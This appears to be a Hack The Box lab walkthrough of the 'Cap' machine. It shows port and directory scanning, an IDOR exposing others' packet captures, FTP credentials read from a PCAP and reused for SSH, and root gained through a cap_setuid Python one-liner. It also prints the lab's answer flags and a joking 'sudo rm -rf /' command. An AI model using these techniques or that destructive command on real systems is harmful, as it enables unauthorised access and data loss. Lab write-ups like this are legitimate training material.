<div align="center">

# 🎯 HTB — Cap — Walkthrough by Amaira Safwen

**Easy · Linux · EU Machines 3**

![Status](https://img.shields.io/badge/status-done-green)
![Difficulty](https://img.shields.io/badge/difficulty-easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![XP](https://img.shields.io/badge/XP-450-orange)

</div>

---

## 📋 Machine Info

| Field          | Value         |
| -------------- | ------------- |
| **Target IP**  | `10.129.91.6` |
| **Hostname**   | `cap.htb`     |
| **OS**         | Linux         |
| **Difficulty** | Easy          |
| **Released**   | 5 June 2021   |
| **Status**     | ✅ Rooted      |

---

## 📑 Table of Contents

* [1. Reconnaissance](#1-reconnaissance)
* [2. Task Answers](#2-task-answers)

  * [Task 1 — Open TCP Ports](#task-1--open-tcp-ports)
  * [Task 2](#task-2)
  * [Task 3](#task-3)
  * [Task 4](#task-4)
  * [Task 5](#task-5)
* [3. Initial Foothold](#3-initial-foothold)
* [4. User Flag](#4-user-flag)
* [5. Privilege Escalation](#5-privilege-escalation)
* [6. Task 8 — Special Capabilities](#6-task-8--special-capabilities)
* [7. Root Flag](#7-root-flag)
* [8. Summary & Lessons Learned](#8-summary--lessons-learned)
* [9. Tools Used](#9-tools-used)

---

# 1. Reconnaissance

## 🔎 Port Scan

```bash
nmap -sT 10.129.91.6
```

<details>
<summary><strong>📄 Raw Output</strong> (click to expand)</summary>

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

</details>

> **📝 My Explanation:**

The first step was to understand what services were exposed by the target machine.

As usual, I started with Nmap because it allows us to quickly identify open TCP ports and the services that may be running behind them.

The goal at this stage is not to immediately exploit anything. Instead, I want to build a basic picture of the attack surface.

From the scan, I identified three open TCP ports:

```text
21/tcp → FTP
22/tcp → SSH
80/tcp → HTTP
```

The HTTP service immediately caught my attention, so I decided to investigate the web application next.

---

# 2. Task Answers

## Task 1 — Open TCP Ports

**❓ Question:** How many TCP ports are open?

**✅ Answer:** `3`

> **📝 My Explanation:**

The Nmap scan revealed three open TCP ports:

```text
21/tcp → FTP
22/tcp → SSH
80/tcp → HTTP
```

This gave me the initial attack surface of the machine.

The HTTP service immediately caught my attention because it exposed a web application that could potentially provide a way into the machine.

However, I also kept the FTP and SSH services in mind during the enumeration phase, since they could potentially become useful later.

At this stage, the main objective was simply to understand what was exposed rather than immediately trying to exploit everything.

---

## Task 2 — Security Snapshot Path

**❓ Question:** After running a "Security Snapshot", the browser is redirected to a path of the format `/[something]/[id]`, where `[id]` represents the ID number of the scan. What is the `[something]`?

**✅ Answer:** `data`

> **📝 My Explanation:**

To understand the web application's available endpoints, I used **FFUF** for directory enumeration.

I ran:

```bash
ffuf -u http://10.129.91.6/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

The scan returned several interesting endpoints:

```text
data        [Status: 302]
ip          [Status: 200]
netstat     [Status: 200]
```

The `/data` endpoint immediately caught my attention because it returned a **302 redirect**.

```text
data [Status: 302, Size: 208, Words: 21, Lines: 4]
```

I then checked the Security Snapshot functionality in the web application. After running a snapshot, the application redirected me to a URL following this format:

```text
/data/[id]
```

The `[id]` represents the ID assigned to the generated scan.

Therefore, the value requested by the task is:

```text
data
```

---

## Task 3 — Accessing Other Users' Scans

**❓ Question:** Are you able to get to other users' scans?

> **📝 My Explanation:**

Since I already found the `/data/[id]` endpoint, I started thinking like any pentester would: **what happens if I just change the ID?** 👀

After creating a Security Snapshot, I got something like:

```text
/data/1
```

So I simply tried changing the number:

```text
/data/2
```

Then I tried a few other IDs to see what would happen.

And yep... I was able to access scans that weren't mine. 😅

So it looks like the application doesn't properly check whether the scan actually belongs to the current user.

**✅ Answer:** `Yes`

---

## Task 4 — Finding the Sensitive PCAP

**❓ Question:** What is the ID of the PCAP file that contains sensitive data?

> **📝 My Explanation:**

At this point, I knew I could access other users' scans by changing the ID in `/data/[id]`.

So now the obvious question was:

**Which scan actually contains something interesting?** 👀

I started by fuzzing the scan IDs:

```bash
ffuf -u http://10.129.91.6/data/FUZZ -w <(seq 0 100)
```

Most IDs returned a `302`, but IDs `0` and `1` returned `200`, which told me that these scans actually existed.

I downloaded both PCAP files:

```bash
wget http://10.129.91.6/download/0 -O 0.pcap
wget http://10.129.91.6/download/1 -O 1.pcap
```

Then I checked their file types:

```bash
file 0.pcap
file 1.pcap
```

Both were valid PCAP capture files.

Instead of immediately opening Wireshark and clicking around for the next 20 minutes, I first tried something simple:

```bash
strings 0.pcap
```

And there it was.

Buried inside the captured traffic was an FTP login:

```text
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
```

👀 **That's definitely sensitive data.**

The other capture was mainly web dashboard traffic, while PCAP `0` contained actual credentials.

### ✅ Answer

```text
0
```

### 💭 Side Thought

PCAP files can contain way more than just network traffic.

When protocols like **FTP** are used without encryption, credentials can sometimes be sitting right there inside the capture.

In this case, `strings` was all I needed to turn a PCAP into valid credentials.

Pretty nice win for such a simple command. 

> I just wish pentesting in real life was always this easy. 

---

## 🔎 Task 5: Identifying the Protocol

**Question:** Which application layer protocol in the PCAP file can the sensitive data be found in?

> **My Explanation:**

Since `0.pcap` was the interesting capture, I wanted to take a closer look at what was inside it.

I started with the same simple command from the previous task:

```bash
strings 0.pcap
```

While going through the output, I found:

```text
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
```

The `USER` and `PASS` commands made the protocol pretty obvious.

This was **FTP traffic**, and because FTP sends authentication data without encryption, the credentials were visible directly in the packet capture.

So yeah, the password was basically just sitting there waiting for someone to find it.

### ✅ Answer

```text
FTP
    
```


      
### 💭 Side Thought

This was a good reminder that you don't always need fancy tools to analyze a PCAP.

Sometimes `strings` is enough to find exactly what you're looking for.

Pentesting isn't always advanced exploitation. Sometimes it's just reading what the machine accidentally left lying around.


---
## 🔐 Task 6: Reusing Nathan's Password

**Question:** We've managed to collect Nathan's FTP password. On what other service does this password work?

> **My Explanation:**

At this point, I had valid credentials for Nathan:

```text
Username: nathan
Password: Buck3tH4TF0RM3!
```

Now the first thing that came to mind was pretty simple:

**"Where else does this password work?"**

I already knew from my Nmap scan that SSH was open on port `22`, so naturally, I had to try it.

Because let's be honest, even the average script kiddie is going to try the same password on every open login service. :p

```bash
ssh nathan@10.129.91.6
```

I entered the password from the PCAP and...

```text
nathan@cap:~$
```

And just like that, we're in.

No exploit. No fancy payload. Just some good old-fashioned password reuse.

### ✅ Answer

```text
SSH
```

### 💭 Side Thought

Password reuse is basically free real estate for attackers.

You compromise one service, find a password, then start wondering where else it works.

In this case, Nathan's FTP password decided to have a second career as an SSH password.
 
---
## 🚩 User Flag

**Question:** Submit the flag located in the `nathan` user's home directory.

> **My Explanation:**

We're already logged in as `nathan`, so I checked the home directory:

```bash
ls
```

And there it is:

```text
user.txt
```

Nothing fancy here. Just read the flag:

```bash
cat user.txt
```

Output:

```text
a4451fce516556e39ebdac2b81aafd32
```

### ✅ Answer

```text
a4451fce516556e39ebdac2b81aafd32
```

### 💭 Side Thought

After all that digging through PCAP files and hunting for credentials, getting the user flag with two commands feels almost suspiciously easy.

I'll take the free points. :p



---

      
      
      
## 🧨 Task 8: Finding the Special Capability

**Question:** What is the full path to the binary on this machine that has special capabilities that can be abused to obtain root privileges?

> **My Explanation:**

We already had a shell as `nathan`, so now it was time to start looking for a way to go from **"hello user"** to **"hello root"**.

The task literally mentions **special capabilities**, so I knew exactly what I wanted to look for.

I ran:

```bash id="7t3q4m"
getcap -r / 2>/dev/null
```

And the machine decided to hand me a small list of interesting binaries:

```text id="d3g1k8"
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

Most of them weren't what I was looking for.

Then I saw:

```text id="x8f2la"
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

And there it was.

**Python. With `cap_setuid`.**

That's definitely not something I want to see when I'm trying to secure a Linux machine.

`cap_setuid` allows the process to change its user ID, which makes this Python binary particularly interesting for privilege escalation.

So at this point, I wasn't looking at Python anymore.

I was looking at a potential **root shell with a Python logo on it.** :p

### ✅ Answer

```text id="n4j7wp"
/usr/bin/python3.8
```

### 💭 Side Thought

Finding a Python binary with `cap_setuid` is basically the Linux equivalent of finding a door that says:

**"DO NOT OPEN"**

Obviously, we're going to investigate the door.

      
---

## 👑 Root Flag

**Question:** Submit the flag located in root's home directory.

> **My Explanation:**

We found the vulnerable binary in the previous task, so now it was time to see if `cap_setuid` was actually as dangerous as it looked.

I ran:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

And suddenly:

```text
root@cap:~#
```

Yep.

That worked a little too well.

I checked my privileges:

```bash
id
```

And got:

```text
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

**Root.**

At this point, there was only one thing left to do.

I checked root's home directory:

```bash
ls /root
```

And found:

```text
root.txt  snap
```

So naturally:

```bash
cat /root/root.txt
```

And there it is:

```text
7784700f7b09e569c2ac3268f78a6512
```

### 🚩 Answer

```text
7784700f7b09e569c2ac3268f78a6512
```

### 💭 Side Thought

```text
7784700f7b09e569c2ac3268f78a6512

root@cap:~# sudo rm -rf /
```


**let's just say Cap didn't make it to the next morning.** :p


      
---

<div align="center">

## 🏴‍☠️ Cap — Rooted

**HTB Easy · Linux**

**Walkthrough by Amaira Safwen**

</div>
